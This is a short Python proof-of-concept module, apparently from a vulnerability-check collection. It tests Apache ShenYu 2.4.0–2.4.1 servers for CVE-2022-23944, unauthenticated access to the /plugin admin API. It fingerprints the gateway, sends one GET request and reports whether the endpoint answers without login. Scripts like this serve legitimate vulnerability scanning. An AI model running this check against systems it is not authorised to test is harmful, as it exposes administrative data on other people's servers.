import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ShenYu Admin Unauth Access''',
        "description": '''User can access /plugin api without authentication. This issue affected Apache ShenYu 2.4.0 and 2.4.1.''',
        "severity": "medium",
        "references": [
            "https://github.com/apache/incubator-shenyu/pull/2462/files", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-23944"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cvss-score": "9.1",
            "cve-id": "CVE-2022-23944",
            "cwe-id": "CWE-306, CWE-862"
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/reapoc/tree/main/2022/CVE-2022-23944/vultarget"
        },
        "tags": ["shenyu", "unauth" , "apache"],
    }


# Vender Fingerprint
def fingerprint(url):
    resp = requests.get(url, timeout=10, verify=False)
    if "<title>ShenYu Gateway</title>" in resp.text:
        return True
    else:
        return False

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = "/plugin"
        method = "GET"
        headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36"}
        resp = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp.status_code == 200 and '"message":"query success"' in resp.text and '"code":200' in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url